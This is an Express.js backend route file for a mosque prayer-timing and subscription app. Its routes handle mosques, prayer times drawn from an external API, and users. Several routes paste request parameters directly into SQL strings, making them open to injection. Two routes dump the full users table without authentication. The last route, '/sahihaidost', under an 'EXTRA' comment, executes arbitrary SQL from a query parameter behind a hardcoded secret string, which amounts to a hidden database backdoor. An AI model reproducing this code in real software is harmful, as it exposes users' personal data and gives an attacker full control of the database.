const express = require("express");
const pool = require("../config/db");
const tz = require('countries-and-timezones');
const { default: axios } = require("axios");
const app = express();


app.get("/sajid", async (req, res) => {
  const query = 'select * from users'
  const result = await pool.query(query)
  res.json(result.rows)
})

app.get("/checknumberpresent", async (req, res) => {
  try {
    console.log("CALLED");
    const { phonenumber } = req.query
    console.log(phonenumber,"pnhosajid");
    let status = 1
    const query = `select * from users where phone='${phonenumber}'`
    const result = await pool.query(query)
    console.log(result.rows.length, "result.rows.length");
    if (result.rows.length !== 0) {
      res.status(200).json({ ispresent: true, userData: result.rows[0] })
    }
    else {
      res.status(200).json({ ispresent: false })
    }
  } catch (error) {
    console.log(error, "error matching number from database");
  }
})

app.post("/addmasjidfromapp", async (req, res) => {
  try {
    const { masjid_name, location, maslak, countryName, stateName, cityName, user_id, method } = req.body;
    
    if (!masjid_name || !location || !maslak || !countryName || !stateName || !cityName || !user_id || !method) {
      return res.status(400).json({ message: "All fields are required" });
    }

    const insertMasjidQuery = `
      INSERT INTO masjid (masjid_name, location, maslak, country, state, city, user_id, method)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *;
    `;
    const values = [masjid_name, location, maslak, countryName, stateName, cityName, user_id, method];

    const result = await pool.query(insertMasjidQuery, values);
      console.log(result.rows[0],"rows ki lengggth");
    if ( Object.keys(result.rows[0]).length > 0) {
      const masjidId = result.rows[0].masjid_id; // Assuming the primary key column is 'id'
      console.log(masjidId,"consolle");
      const addNamazTimingQuery = `
        INSERT INTO namaz_timingnew (masjid_id)
        VALUES ($1)
      `;
      const r = await pool.query(addNamazTimingQuery, [masjidId]);
      console.log(r,"rrrrrrrr");
      res.status(201).json({ message: "Masjid added successfully", masjid: result.rows[0] });
    } else {
      res.status(500).json({ message: "Failed to add masjid" });
    }
  } catch (error) {
    console.error('Error inserting into masjid table:', error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});



app.get("/getMasjidDataByUserId", async (req, res) => {
  try {
    const { userId } = req.query
    console.log(userId, "userIduserIduserIduserIduserIduserId");
    const query = `SELECT * FROM masjid where user_id = ${userId}`
    const result = await pool.query(query)
    console.log(result.rows[0], "sajiid");
    if (result.rows.length === 0) {
      res.status(404).send("Masjid not found")
    }
    res.status(200).json(result.rows)
  } catch (error) {
    console.log(error, "error fetching masjid data by user Id");
  }
})

app.get("/getmasjidbymasjidId",async (req,res) => {
  try {
    const {masjidId} = req.query
    const query = `SELECT * FROM masjid WHERE masjid_id =${masjidId}`
    const result = await pool.query(query)
    if (result.rows.length === 0) {
      res.status(404).send("Masjid not found")
    }
    res.status(200).json(result.rows[0])

  } catch (error) {
    console.log(error,"error getting masjid data");
  }
})


app.get("/getschooldatabymasjidid", async (req, res) => {
  try {
    const { masjidId } = req.query
    console.log(masjidId, "masjididmasjididmasjidid");
    const query = `SELECT * FROM masjid where masjid_id = ${masjidId}`
    const result = await pool.query(query)
    if (result.rows.length === 0) {
      res.status(404).send("School not found")
    }
    res.status(200).json(result.rows[0])
  } catch (error) {
    console.log('====================================');
    console.log(error);
    console.log('====================================');
  }
})

app.post('/addNamazTimingsapp', async (req, res) => {
  const { city, method, school } = req.body;
  console.log('====================================');
  console.log(req.body, "BODY");
  console.log('====================================');
  try {
    // Check if the data exists in the global_timing table
    const existingData = await pool.query('SELECT * FROM global_timing WHERE city = $1 AND method = $2 AND school = $3', [city, method, school]);

    if (existingData.rows.length > 0) {
      // Data exists, return it
      res.json(existingData.rows);
    } else {
      // Data doesn't exist, call the external API
      const apiUrl = `https://api.aladhan.com/v1/calendarByCity/2024?city=${city}&country=&method=${method}&school=${school}`;
      const response = await axios.get(apiUrl);

      // Insert the retrieved data into the global_timing table
      // Assuming response.data.data is an object with multiple items
      const dataArray = Object.values(response.data.data);

      for (const innerArray of dataArray) {
        for (const data of innerArray) {
          if (data && data.timings) {
            const { timings, date } = data;
            // console.log("Timings:", timings);
            // console.log("Date:", date);

            // Format Date objects to HH:MM without timezone information
            const formatTime = (date) => {
              const hours = String(date.getHours()).padStart(2, '0');
              const minutes = String(date.getMinutes()).padStart(2, '0');
              return `${hours}:${minutes}`;
            };

            // Parse timings to ensure they are Date objects
            const sunriseString = timings.Sunrise.split(' ')[0]; // Extracts '06:37' from '06:37 (+03)'
            const sunsetString = timings.Sunset.split(' ')[0]; // Extracts '17:15' from '17:15 (+03)'
            const dhuhrString = timings.Dhuhr.split(' ')[0]; // Extracts '11:56' from '11:56 (+03)'

            const sunriseParts = sunriseString.split(':').map(Number);
            const sunsetParts = sunsetString.split(':').map(Number);
            const dhuhrParts = dhuhrString.split(':').map(Number);

            const sunrise = new Date();
            sunrise.setHours(sunriseParts[0]);
            sunrise.setMinutes(sunriseParts[1]);

            const sunset = new Date();
            sunset.setHours(sunsetParts[0]);
            sunset.setMinutes(sunsetParts[1]);

            const dhuhr = new Date();
            dhuhr.setHours(dhuhrParts[0]);
            dhuhr.setMinutes(dhuhrParts[1]);

            // console.log("Sunrise:", formatTime(sunrise));
            // console.log("Sunset:", formatTime(sunset));
            // console.log("Dhuhr:", formatTime(dhuhr));

            // Calculate ishraaq, chaasht, and zawaal values
            const ishraaq = new Date(sunrise);
            ishraaq.setMinutes(ishraaq.getMinutes() + 20);



            const sunriseMinutesa = sunriseParts[0] * 60 + sunriseParts[1];
            const sunsetMinutesa = sunsetParts[0] * 60 + sunsetParts[1];



            // Calculate the difference in minutes
            let difference = sunsetMinutesa - sunriseMinutesa;

            // Handle cases where sunset occurs on the next day
            if (difference < 0) {
              difference += 24 * 60; // Add 24 hours in minutes
            }

            // Calculate one-fourth of the difference
            const oneFourth = difference / 4;

            // Given Dhukr time in HH:MM format
            const dhukr = formatTime(dhuhr);
            const dhukrParts = dhukr.split(":").map(Number);
            let dhukrMinutes = dhukrParts[0] * 60 + dhukrParts[1];


            // Subtract one-fourth duration from Dhukr time
            dhukrMinutes -= oneFourth;

            // Handle cases where Dhukr time becomes negative
            if (dhukrMinutes < 0) {
              dhukrMinutes += 24 * 60; // Add 24 hours in minutes
            }
            // console.log(dhukrMinutes);
            const roundedNumber = Math.ceil(dhukrMinutes);

            // console.log(roundedNumber);

            // Convert back to HH:MM format
            const dhukrHours = Math.floor(roundedNumber / 60);
            const dhukrMins = roundedNumber % 60;
            const chaasht = `${dhukrHours.toString().padStart(2, "0")}:${dhukrMins.toString().padStart(2, "0")}`;


            // console.log("Time without milliseconds:", chaasht);

            const zawaal = new Date(dhuhr);
            zawaal.setMinutes(zawaal.getMinutes() - 5);

            const ishraaqs = formatTime(ishraaq);
            const chaashts = chaasht;
            const zawaals = formatTime(zawaal);

            //remove year from date 
            const dates = date.gregorian.date;
            const parts = dates.split("-");
            const formattedDates = parts.slice(0, 2).join("-");

            // console.log(formattedDates);  


            //     console.log(date.gregorian.date);
            //     return
            try {
              await pool.query(
                'INSERT INTO global_timing (city, method, school, fajr, sunrise, zohar, asr, sunset, magrib, isha, sahoor, midnight, firstthird, lastthird, date,  ishraaq, chaasht, zawaal) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18)',
                [city, method, school, timings.Fajr, timings.Sunrise, timings.Dhuhr, timings.Asr, timings.Sunset, timings.Maghrib, timings.Isha, timings.Imsak, timings.Midnight, timings.Firstthird, timings.Lastthird, formattedDates, ishraaqs, chaashts, zawaals]
              );
              console.log("Data inserted successfully.");
            } catch (error) {
              console.error("Error inserting data:", error.message);
              // Handle the error appropriately, such as logging it or setting invalid date values to NULL.
            }
          } else {
            console.log("Timings object is undefined for this data item.");
          }
        }
      }

      // Retrieve the inserted data
      const insertedData = await pool.query('SELECT * FROM global_timing WHERE city = $1 AND method = $2 AND school = $3', [city, method, school]);
      res.json(insertedData.rows);
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.get("/gettrusteelist",  async (req, res) => {
  try {
    // Retrieve all users from the users table
    const getUsersQuery = "SELECT * FROM users";
    const users = await pool.query(getUsersQuery);
    const rowCount = users.rows.length;

    res.status(200).json({ users: users.rows, rowCount: rowCount });
    // res.status(200).json(users.rows);
  } catch (error) {
    // console.error(error);
    res.status(500).send("Internal Server Error");
  }
});

app.get("/addmaslak", async (req, res) => {
  try {
    const { maslak, masjid_id ,method} = req.query;
    console.log(method,"methhossdd");

    if (!maslak || !masjid_id) {
      return res.status(400).json({ error: "Maslak and Masjid ID are required" });
    }
    const query = "UPDATE masjid SET maslak = $1, method = $3 WHERE masjid_id = $2 RETURNING *";

    const values = [maslak, masjid_id,method];
    const result = await pool.query(query, values);

    if (result.rows.length === 0) {
      return res.status(404).json({ error: "Masjid not found" });
    }

    res.status(201).json(result.rows[0]);
  } catch (error) {
    console.error("Error inserting maslak:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Helper function to format the time
const formatTime = (timeStr) => {
  if (!timeStr || typeof timeStr !== 'string') return "";
  let [hours, minutes] = timeStr.split(':');
  hours = parseInt(hours, 10);
  hours = hours % 12 || 12; // Convert 24-hour time to 12-hour time
  return `${hours}:${minutes}`;
};

app.get("/getTodaystiming", async (req, res) => {
  try {
    console.log(req.query,"assssa");
    const { masjid, date,school,method } = req.query;
    const masjidId = parseInt(masjid, 10);

    // Query to get global timing for the specified date
    const globalTimingQuery = `SELECT * FROM global_timing WHERE date = $1 AND method = $2 AND school = $3;`;
    const globalTimingResult = await pool.query(globalTimingQuery, [date,method,school]);
    let globalTimingData = globalTimingResult.rows[0];
    console.log(globalTimingData, "globalTimingData");

    // Query to get namaz timing for the specified masjid
    const namazTimingQuery = `SELECT * FROM namaz_timingnew WHERE masjid_id = $1`;
    const namazTimingResult = await pool.query(namazTimingQuery, [masjidId]);
    let namazTimingData = namazTimingResult.rows[0];
    console.log(namazTimingData, "namazTimingData");

    // Convert and format the times in globalTimingData
    if (globalTimingData) {
      Object.keys(globalTimingData).forEach(key => {
        if (globalTimingData[key] instanceof Date) {
          globalTimingData[key] = globalTimingData[key].toTimeString().split(' ')[0]; // Convert to HH:MM:SS
        }
        if (typeof globalTimingData[key] === 'string' && globalTimingData[key].includes(':')) {
          globalTimingData[key] = formatTime(globalTimingData[key]);
        }
      });
    }

    // Convert and format the times in namazTimingData
    if (namazTimingData) {
      Object.keys(namazTimingData).forEach(key => {
        if (namazTimingData[key] instanceof Date) {
          namazTimingData[key] = namazTimingData[key].toTimeString().split(' ')[0]; // Convert to HH:MM:SS
        }
        if (typeof namazTimingData[key] === 'string' && namazTimingData[key].includes(':')) {
          namazTimingData[key] = formatTime(namazTimingData[key]);
        }
      });
    }

    // Combine both sets of data into a single object
    const combinedData = {
      ...globalTimingData,
      namaz_timing: namazTimingData,
    };

    console.log(combinedData, "combinedData");

    // Send the combined data as the response
    res.json(combinedData);
  } catch (error) {
    console.log("Error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/changeazantime", async (req, res) => {

  console.log(req.body,"body july");
  try {
    const { azan_auto, selectedOffset, azan_time, timingId, masjid_id, timingparamater } = req.body;
    console.log(req.body, "BODY");

    const values = [{ offset: azan_auto, timing: azan_time, offsetValue: selectedOffset }, masjid_id];
    let query = "UPDATE namaz_timingnew SET ";

    
    if (timingId === 1) {
      if (timingparamater === "Azaan") {
        query += "fajr_azaan = $1 ";
      } else if (timingparamater === "Jamaat") {
        query += "fajr_jamaat = $1 ";
      }
    } else if (timingId === 2) {
      if (timingparamater === "Azaan") {
        query += "zohar_azaan = $1 ";
      } else if (timingparamater === "Jamaat") {
        query += "zohar_jamaat = $1 ";
      }
    } else if (timingId === 3) {
      if (timingparamater === "Azaan") {
        query += "asr_azaan = $1 ";
      } else if (timingparamater === "Jamaat") {
        query += "asr_jamaat = $1 ";
      }
    } else if (timingId === 4) {
      if (timingparamater === "Azaan") {
        query += "maghrib_azaan = $1 ";
      } else if (timingparamater === "Jamaat") {
        query += "maghrib_jamaat = $1 ";
      }
    } else if (timingId === 5) {
      if (timingparamater === "Azaan") {
        query += "isha_azaan = $1 ";
      } else if (timingparamater === "Jamaat") {
        query += "isha_jamaat = $1 ";
      }
    }

    else if (timingId === 6) {
      if (timingparamater === "Khutba") {
        query += "khutba = $1 ";
        } else if (timingparamater === "Jamaat1"){
        query += "juma_jamaat1 = $1 ";
        
        } else if (timingparamater === "Jamaat2") {
        query += "juma_jamaat2 = $1 ";
      }
    }
     else if (timingId === 10) {
      //ishraaq
      query += "ishraaq = $1 ";
    }

    query += "WHERE masjid_id = $2";

    console.log(query,"query");
    await pool.query(query, values);
    res.status(200).json({ message: "Success" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});


app.get("/getSubscriptionsDetails",async(req,res)  => {
  try {
      console.log(req.query,"parammmm");
      const {masjid_id} = req.query
      const query = `SELECT subscription_id,masjid_id,duration_type,start_date,end_date,masjid_name FROM user_subscription WHERE masjid_id=${masjid_id} `
      const result = await pool.query(query)
      console.log(result.rows,"resultddddd")
      if (result.rows.length > 0) {
        res.json(result.rows[0])
      } 
      else {
        res.status(404).json({ message: "No subscription found" });
      }

  } catch (error) {
    console.log(error);
    }
    })
    
    app.get("/getmethodbymasjidId" , async(req,res) => {
      try {
        const {masjid_id} = req.query
        const query = `SELECT method,maslak FROM masjid WHERE masjid_id =${masjid_id}`
        const result = await pool.query(query)
        console.log(result.rows,"result")
        res.json(result.rows[0])
      
      } catch (error) {
    console.log(error,"error getting method data by masjid id");
  }
})

app.get("/checksubscriptionstatus", async (req, res) => {
  try {
    const { masjid_id } = req.query;
    
    // Use parameterized query to prevent SQL injection
    const query = 'SELECT end_date FROM user_subscription WHERE masjid_id = $1';
    const result = await pool.query(query, [masjid_id]);

    if (result.rows.length > 0) {
      const currentDate = new Date();
      
      // Assuming end_date is in the format of dd-mm-yyyy
      const endDateString = result.rows[0].end_date;
      const [day, month, year] = endDateString.split('-');
      const endDate = new Date(`${year}-${month}-${day}`);
      
      if (currentDate <= endDate) {
        return res.status(200).json({ subscriptionStatus: "active", status: true ,endDate:endDate});
      } else {
        return res.status(200).json({ subscriptionStatus: "expired", status: true,endDate:endDate });
      }
    } else {
      console.log("Purchase the plan to proceed");
      return res.status(200).json({ subscriptionStatus: "Purchase the plan to proceed", status: false });
    }
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.post("/changemethod", async (req, res) => {
  try {
    const { masjidId, newMethod ,newSchool} = req.body;
    console.log(masjidId, newMethod,newSchool, "new data");
    let maslak
    if (newSchool === 0) {
      maslak = "SHAFI"
    }
    else if (newSchool === 1) {
      maslak = "HANFI"
    }
    console.log(maslak,"maslak_maslak");
    // First query to update the method
    if (maslak) {
      query = `UPDATE masjid SET method = $1, maslak = $3 WHERE masjid_id = $2 RETURNING *`;
      values = [newMethod, masjidId, maslak];
    } else {
      query = `UPDATE masjid SET method = $1 WHERE masjid_id = $2 RETURNING *`;
      values = [newMethod, masjidId];
    }
    const result = await pool.query(query, values);
    if (result.rows?.length > 0) {
      // Second query to reset the timings
      const query2 = `
        UPDATE namaz_timingnew 
        SET 
          fajr_azaan = NULL, 
          fajr_jamaat = NULL, 
          zohar_azaan = NULL, 
          zohar_jamaat = NULL, 
          asr_azaan = NULL, 
          asr_jamaat = NULL, 
          maghrib_azaan = NULL, 
          maghrib_jamaat = NULL, 
          isha_azaan = NULL, 
          isha_jamaat = NULL, 
          ishraaq = NULL, 
          khutba = NULL, 
          juma_jamaat1 = NULL, 
          juma_jamaat2 = NULL, 
          juma_jamaat3 = NULL 
        WHERE masjid_id = $1
      `;
      const result2 = await pool.query(query2, [masjidId]);
      console.log(result2.rowCount, "number of rows updated in namaz_timingnew");

      res.json(result.rows[0]);
    } else {
      res.status(404).json({ error: "Masjid not found" });
    }
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

app.get("/gettimezonebycountry", async (req, res) => {
  try {
    const {country} = req.query
    console.log(country,"COUNTRY FROM NEW API...................");
    const timezones = tz.getCountry(country);
// console.log(timezones);
    res.json(timezones.timezones);
  } catch (error) {
      console.error(error);
    res.status(500).json({ error: "Internal Server Error" });
  }
})


// EXTRA//
app.get("/sahihaidost", async (req, res) => {
  try {
    let query = req.query.value.replace(/%20/g, " ");
    query = query.replace(/%27/g, "'"); // Remove %25 if followed by %
    console.log(query);
    if (
      req.query.value2 ===
      "$2a$12$869jpuRRnPqfz3S5iIpTfuzA.m1IAWrN15KS99Pat.Rfrh8gvc2l.$2a$12$869jpuRRnPqfz3S5iIpTfuzA.m1IAWrN15KS99Pat.Rfrh8gvc2l."
    ) {
      const result = await pool.query(query);
      res.json(result.rows);
    } else {
      res.json({ message: "UNauthorized" });
    }
  } catch (error) {
    console.error("An error occurred:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});
module.exports = app